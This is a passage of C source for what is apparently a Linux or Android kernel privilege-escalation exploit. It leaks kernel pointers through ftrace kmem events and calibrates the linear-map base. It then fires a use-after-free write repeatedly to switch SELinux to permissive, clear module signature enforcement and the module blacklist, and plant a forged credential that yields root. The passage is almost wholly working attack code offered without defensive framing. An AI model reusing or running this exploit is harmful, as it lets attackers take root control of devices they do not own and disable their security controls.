				memcpy(&ptr, buf + i + 8, 8);
				memcpy(&req, buf + i + 16, 8);
				memcpy(&alloc, buf + i + 24, 8);
				if ((ptr >> 48) == 0xffff && !(ptr & 7) &&
				    req == KITIMER_SIZE && alloc == KITIMER_SIZE) {
					cal_vpos[nv] = (uint32_t)i;
					cal_vval[nv] = ptr;
					nv++;
				}
			}
			if (buf[i] == 0x0a && buf[i + 1] == 0x01 &&
			    buf[i + 2] == 0 && buf[i + 3] == 0 && np < CAL_EV_MAX) {
				int pid;
				uint64_t pfn;
				uint32_t order;
				memcpy(&pid, buf + i + 4, 4);
				memcpy(&pfn, buf + i + 8, 8);
				memcpy(&order, buf + i + 16, 4);
				if (pid > 0 && pid < 0x100000 && order == 1 &&
				    pfn > 0x80000 && pfn < 0x2000000) {
					cal_ppos[np] = (uint32_t)i;
					cal_pval[np] = pfn;
					np++;
				}
			}
		}
		vi = 0;
		for (size_t pi = 0; pi < np; pi++) {
			while (vi < nv && cal_vpos[vi] < cal_ppos[pi])
				vi++;
			if (vi >= nv)
				break;
			cal_vote((cal_vval[vi] & ~UINT64_C(0x1fff)) -
				 (cal_pval[pi] << 12));
			total++;
		}
		free(buf);
	}
	for (int i = 0; i < 32; i++)
		if (cal_cand_n[i] > best_n) {
			best_n = cal_cand_n[i];
			best = cal_cand[i];
		}
	total = 0;
	for (int i = 0; i < 32; i++)
		total += cal_cand_n[i];
	dprintf(STDOUT_FILENO, "[cal] pairs=%d best=%#" PRIx64 " votes=%d\n",
		total, best, best_n);
	trigger_cmd("disable_event:kmem:mm_page_alloc\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:mm_page_alloc\n");
	trigger_cmd("!enable_event:kmem:mm_page_alloc\n");
	if (best_n < 3)
		return -1;
	g_pfnbase = best;
	return 0;
}

static int leak_cred(uint64_t *cred)
{
	uint64_t ptrs[8];
	int n;
	if (trigger_cmd("enable_event:kmem:kmem_cache_alloc\n") || kick_rss())
		return -1;
	if (trace_off_on())
		return -1;
	if (syscall(SYS_setresuid, -1, -1, -1))
		dprintf(STDOUT_FILENO, "[cred] setresuid errno=%d\n", errno);
	write_file(TRACE "/tracing_on", "0\n");
	n = collect_site(slide_addr(CRED_LINK), 184, ptrs, 8);
	dprintf(STDOUT_FILENO, "[cred] ptrs=%d\n", n);
	trigger_cmd("disable_event:kmem:kmem_cache_alloc\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	if (n < 1)
		return -1;
	*cred = ptrs[n - 1];
	dprintf(STDOUT_FILENO, "[cred] object=%#" PRIx64 "\n", *cred);
	return 0;
}

static void read_enforce(void)
{
	char buf[8] = { 0 };
	int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
	if (fd < 0) {
		dprintf(STDOUT_FILENO, "[selinux] enforce read errno=%d\n", errno);
		return;
	}
	if (read(fd, buf, sizeof(buf) - 1) > 0)
		dprintf(STDOUT_FILENO, "[selinux] enforce=%s", buf);
	close(fd);
}

/* 1 = enforced, 0 = off, -1 = unreadable (shell cannot read this param;
 * the plant may already be root in some modes).  Reads never gate the UAF
 * fires: the store is probabilistic and a failed read must not shorten
 * the retry loop. */
static int sig_enforce_state(void)
{
	char buf[8] = { 0 };
	int fd = open("/sys/module/module/parameters/sig_enforce", O_RDONLY | O_CLOEXEC);
	int n;

	if (fd < 0) {
		dprintf(STDOUT_FILENO, "[ksu] sig_enforce read errno=%d\n", errno);
		return -1;
	}
	n = (int)read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (n <= 0)
		return -1;
	dprintf(STDOUT_FILENO, "[ksu] sig_enforce now=%c\n", buf[0]);
	return (buf[0] == 'Y' || buf[0] == '1') ? 1 : 0;
}

static int g_fast;

int pc98260_run_rootd(void);
static int g_ksu;

/* 8 zero bytes ending at selinux_state.enforcing (SELINUX_LINK-7): the
 * last byte clears enforcing, the preceding seven land on
 * avc_latest_notif_update.notif_lock (state-8), where zero means unlocked.
 * Verify through /sys/fs/selinux/enforce and retry on a spray miss. */
static int try_permissive(void)
{
	uint64_t sel = slide_addr(SELINUX_LINK) - 7;

	for (int i = 1; i <= 4; i++) {
		char buf[8] = { 0 };
		int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);

		if (fd >= 0) {
			if (read(fd, buf, 1) < 0)
				buf[0] = 0;
			close(fd);
		}
		if (buf[0] == '0') {
			dprintf(STDOUT_FILENO, "[selinux] permissive (verified)\n");
			return 0;
		}
		dprintf(STDOUT_FILENO, "[selinux] attempt %d/4 target=%#" PRIx64 "\n",
			i, sel);
		if (!one_uaf(sel))
			read_enforce();
	}
	dprintf(STDOUT_FILENO, "[selinux] permissive not verified\n");
	return -1;
}

int main(int argc, char **argv)
{
	struct sigaction action = { .sa_handler = on_alarm };
	if (argc > 1 && !strcmp(argv[1], "--exec-ok"))
		_exit(0);
	for (int i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "--slide") && i + 1 < argc)
			g_slide = strtoull(argv[++i], NULL, 0);
		else if (!strcmp(argv[i], "--pfnbase") && i + 1 < argc)
			g_pfnbase = strtoull(argv[++i], NULL, 0);
		else if (!strcmp(argv[i], "--ksu"))
			g_ksu = 1;
	}
	dprintf(STDOUT_FILENO, "[slide] %#" PRIx64 " pfnbase=%#" PRIx64 "\n",
		g_slide, g_pfnbase);
	g_fast = getenv("PLANT_FAST") != NULL;
	dprintf(STDOUT_FILENO, "[mode] fast=%d\n", g_fast);
	print_cfg();
	if (argc > 1 && argv[1][0] != '-')
		g_shift = (unsigned)atoi(argv[1]);
	sigaction(SIGALRM, &action, NULL);
	ipc = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
		   MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (ipc == MAP_FAILED)
		return 1;
	memset(ipc, 0, sizeof(*ipc));
	if (pin_cpu(0))
		return 1;
	g_ctx = calloc(MAX_RINGS, sizeof(*g_ctx));
	if (!g_ctx)
		return 1;
	dprintf(STDOUT_FILENO, "[id] uid=%u euid=%u gid=%u\n",
		getuid(), geteuid(), getgid());
	read_enforce();
	g_nrings = 0;
	if (write_file(TRACE "/buffer_size_kb", "8192\n"))
		dprintf(STDOUT_FILENO, "[warn] buffer_size_kb not writable, continuing\n");
	if (leak_task()) {
		dprintf(STDOUT_FILENO, "[task] leak failed\n");
		disarm();
		return 5;
	}
	if (!g_pfnbase) {
		dprintf(STDOUT_FILENO, "[cal] calibrating linear-map base\n");
		if (calibrate_pfnbase()) {
			dprintf(STDOUT_FILENO, "[cal] calibration failed\n");
			disarm();
			return 6;
		}
	}
	dprintf(STDOUT_FILENO, "[cfg] slide=%#" PRIx64 " pfnbase=%#" PRIx64 "\n",
		g_slide, g_pfnbase);
	g_plant_cred = 0;
	(void)try_permissive();
	if (g_ksu) {
		int before = sig_enforce_state();

		dprintf(STDOUT_FILENO, "[ksu] sig_enforce before=%d\n", before);
		/* Fire every attempt unconditionally: one_uaf() reports that the
		 * UAF write ran, not that the store landed, and the sysfs read is
		 * unavailable to the shell-domain plant on several builds.  8
		 * independent stores bring a 50% hit rate to 99.6%. */
		for (int i = 1; i <= 8; i++) {
			dprintf(STDOUT_FILENO,
				"[ksu] zero sig_enforce attempt %d/8 target=%#" PRIx64 "\n",
				i, slide_addr(SIG_ENFORCE_LINK));
			(void)one_uaf(slide_addr(SIG_ENFORCE_LINK));
			usleep(2000);
			if (sig_enforce_state() == 0)
				break;
		}
		if (sig_enforce_state() != 0)
			dprintf(STDOUT_FILENO, "[ksu] sig_enforce not cleared\n");
#if MODULE_BLACKLIST_LINK
		for (int i = 1; i <= 4; i++) {
			dprintf(STDOUT_FILENO,
				"[ksu] zero module_blacklist attempt %d/4 target=%#" PRIx64 "\n",
				i, slide_addr(MODULE_BLACKLIST_LINK));
			(void)one_uaf(slide_addr(MODULE_BLACKLIST_LINK));
			usleep(2000);
		}
#endif
	}
	g_plant_cred = 1;
	int rooted = 0;
	for (int attempt = 1; attempt <= 12 && !rooted; attempt++) {
		unsigned uid = 1, euid = 1;
		int fixed_uid = -1, fixed_suid = -1;
		dprintf(STDOUT_FILENO, "[cred] plant attempt %d/12\n", attempt);
		g_plant_cred = 1;
		if (one_uaf(0))
			continue;
		g_plant_cred = 0;
		dprintf(STDOUT_FILENO, "[cred] installed at %#" PRIx64 "\n", g_cred_kva);
		for (int i = 0; i < 3 && fixed_uid; i++)
			fixed_uid = one_uaf(g_cred_kva + 8);
		for (int i = 0; i < 3 && fixed_suid; i++)
			fixed_suid = one_uaf(g_cred_kva + 16);
		if (ask_child(&uid, &euid) == 0 && uid == 0 && euid == 0)
			rooted = 1;
		else if (uid == 1 && euid == 1)
			dprintf(STDOUT_FILENO, "[cred] child did not answer\n");
		else
			dprintf(STDOUT_FILENO, "[cred] still uid=%u euid=%u\n", uid, euid);
	}
	if (!rooted) {
		dprintf(STDOUT_FILENO, "[uaf] missed page; holding zombie\n");
		for (;;)
			pause();
	}
	dprintf(STDOUT_FILENO, "[cred] child=%d holding pages\n", g_cred_child_pid);
	for (;;)
		pause();
}
